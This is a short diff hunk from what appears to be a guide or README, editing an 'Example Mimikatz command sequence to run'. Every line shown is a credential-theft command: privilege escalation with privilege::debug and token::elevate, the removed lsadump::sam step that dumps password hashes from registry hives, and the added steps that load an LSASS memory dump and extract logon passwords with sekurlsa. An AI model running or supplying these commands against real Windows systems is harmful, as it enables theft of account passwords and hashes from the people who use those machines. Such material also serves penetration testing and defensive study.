@@ -94,8 +94,8 @@ Example Mimikatz command sequence to run:
 
 #> privilege::debug
 #> token::elevate
-#> log hash.txt
-#> lsadump::sam filename1.hiv filename2.hiv
+#> sekurlsa::minidump lsass.dmp
+#> sekurlsa::logonpasswords
 
 
 ```
